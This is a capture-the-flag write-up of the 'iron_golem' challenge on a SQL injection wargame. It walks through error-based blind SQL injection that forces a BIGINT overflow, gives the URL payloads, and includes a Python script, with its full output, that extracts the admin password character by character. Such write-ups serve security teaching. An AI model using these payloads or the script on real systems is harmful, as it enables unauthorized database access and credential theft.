---
custom_edit_url: null
sidebar_position: 21
---

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Kunull/Write-ups/assets/110326359/729548a2-4e56-43aa-9881-8fbfd2a827ab)
</figure>

We are provided with the SQL query:

```sql
SELECT id FROM prob_iron_golem WHERE id='admin' AND pw='{$_GET[pw]}'
```

In this challenge, the code does not print the `Hello admin` message. Therefore we have to perform and Error-based SQL injection.

## Error-based Blind SQL Injection

In order to distinguish whether the resultant query returns `True` or not, we can use error messages. Since the application does not output any error messages either, we have to introduce an error.

### ERROR 1690 (22003): BIGINT value is out of range

In SQL the maximum value for a column is `9223372036854775807`. If the value exceeds the limit, it throws the `ERROR 1690 (22003): BIGINT value is out of range` error message.

This is the error we will be exploiting.

### Retrieving the password length

If we provide the following URI parameter:

```
?pw=' OR id='admin' AND if(length(pw)=1, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_iron_golem WHERE id='admin' AND pw='' OR id='admin' AND if(lenght(pw)=1, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -'
```

The above SQL query will perform the `0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF` operation if `lenght(pw)=1` for `id='admin'`. Since the result of the multiplication operation would be greater than `9223372036854775807`, the challenge would throw an error if the condition is met.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Kunull/Write-ups/assets/110326359/d98bd98b-8b29-49ba-a28e-3fcc8cb7177a)
</figure>

Since the error wasn't thrown, we know that the multiplication was not performed. This means that the length of the `pw` for `id='admin'` is more than 1.

If we keep increasing the length and provide the following URI parameter:

```
?pw=' OR id='admin' AND if(length(pw)=32, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_iron_golem WHERE id='admin' AND pw='' OR id='admin' AND if(lenght(pw)=32, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -'
```

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Kunull/Write-ups/assets/110326359/08f92ace-ad67-4497-87a9-e5f69510ecc8)
</figure>

That tells us that the length of the `pw` column is 32.


### Leaking the password

Next, we can leak the password byte by byte using the `substr()` function.

#### `substr()`

<figure style={{ textAlign: 'center' }}>
![Pasted image 20240610125927](https://github.com/Kunull/Write-ups/assets/110326359/121b2dab-27a1-41f1-8759-aa9b829c815a)
</figure>

If we provide the following URI parameter:

```
?pw=' OR id='admin' AND if(substr(pw, 1, 1)='0', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_iron_golem WHERE id='admin' AND pw='' OR id='admin' AND if(substr(pw, 1, 1)='0', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -'
```

The above SQL query will perform the `0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF` operation if the first character of the `pw` for `id='admin'` is `0`. Since the result of the multiplication operation would be greater than `9223372036854775807`, the challenge would throw an error if the condition is met.

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Kunull/Write-ups/assets/110326359/b58f4cf1-d837-4501-ba48-c2d7a929b454)
</figure>

The error was invoked. This means that the first character of the `pw` for `id='admin'` is `0`.
We can repeat this process to leak out all 32 characters.

```
06b5a6c16e8830475f983cc3a825ee9a
```

### Script

We can automate the process using a script.

```python title="iron_golem_script.py"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'vdr0c0g98drafh42m3iitpc9r4'}
url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
password_length = 0

for x in range(0, 100):
  payload = f"' or id='admin' and if(length(pw)={x}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "out of range" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] Password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' OR id='admin' AND if(substr(pw, {index}, 1)='{char}', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "out of range" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\iron_golem_script.py

[!] Payload: ?pw=' or id='admin' and if(length(pw)=32, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[!] Payload (URL encoded): ?pw=%27+or+id%3D%27admin%27+and+if%28length%28pw%29%3D32%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[!] Password length: 32

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 1, 1)='0', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+1%2C+1%29%3D%270%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 1: 0

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 2, 1)='6', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+2%2C+1%29%3D%276%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 2: 6

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 3, 1)='b', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+3%2C+1%29%3D%27b%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 3: b

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 4, 1)='5', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+4%2C+1%29%3D%275%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 4: 5

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 5, 1)='a', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+5%2C+1%29%3D%27a%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 5: a

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 6, 1)='6', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+6%2C+1%29%3D%276%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 6: 6

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 7, 1)='c', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+7%2C+1%29%3D%27c%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 7: c

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 8, 1)='1', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+8%2C+1%29%3D%271%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 8: 1

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 9, 1)='6', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+9%2C+1%29%3D%276%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 9: 6

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 10, 1)='e', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+10%2C+1%29%3D%27e%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 10: e

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 11, 1)='8', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+11%2C+1%29%3D%278%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 11: 8

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 12, 1)='8', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+12%2C+1%29%3D%278%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 12: 8

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 13, 1)='3', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+13%2C+1%29%3D%273%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 13: 3

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 14, 1)='0', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+14%2C+1%29%3D%270%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 14: 0

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 15, 1)='4', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+15%2C+1%29%3D%274%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 15: 4

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 16, 1)='7', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+16%2C+1%29%3D%277%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 16: 7

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 17, 1)='5', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+17%2C+1%29%3D%275%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 17: 5

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 18, 1)='f', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+18%2C+1%29%3D%27f%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 18: f

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 19, 1)='9', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+19%2C+1%29%3D%279%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 19: 9

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 20, 1)='8', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+20%2C+1%29%3D%278%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 20: 8

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 21, 1)='3', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+21%2C+1%29%3D%273%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 21: 3

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 22, 1)='c', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+22%2C+1%29%3D%27c%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 22: c

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 23, 1)='c', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+23%2C+1%29%3D%27c%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 23: c

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 24, 1)='3', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+24%2C+1%29%3D%273%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 24: 3

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 25, 1)='a', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+25%2C+1%29%3D%27a%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 25: a

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 26, 1)='8', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+26%2C+1%29%3D%278%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 26: 8

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 27, 1)='2', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+27%2C+1%29%3D%272%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 27: 2

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 28, 1)='5', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+28%2C+1%29%3D%275%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 28: 5

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 29, 1)='e', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+29%2C+1%29%3D%27e%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 29: e

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 30, 1)='e', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+30%2C+1%29%3D%27e%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 30: e

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 31, 1)='9', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+31%2C+1%29%3D%279%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 31: 9

[+] Payload: ?pw=' OR id='admin' AND if(substr(pw, 32, 1)='a', 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) -- -
[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+if%28substr%28pw%2C+32%2C+1%29%3D%27a%27%2C+0xFFFFFFFFFFFFFF%2A0xFFFFFFFFFFFFFF%2C+1%29+--+-
[+] Character at index 32: a

[!] Extracted password: 06b5a6c16e8830475f983cc3a825ee9a
[!] Final payload: ?pw=06b5a6c16e8830475f983cc3a825ee9a
```

We can now provide the following URI parameter:

```
?pw=06b5a6c16e8830475f983cc3a825ee9a
```

The resultant query becomes:

```sql
SELECT id FROM prob_iron_golem WHERE id='admin' AND pw='06b5a6c16e8830475f983cc3a825ee9a'
```

<figure style={{ textAlign: 'center' }}>
![0](https://github.com/Kunull/Write-ups/assets/110326359/767ddf08-937c-4b54-ba8c-98845814d803)
</figure>
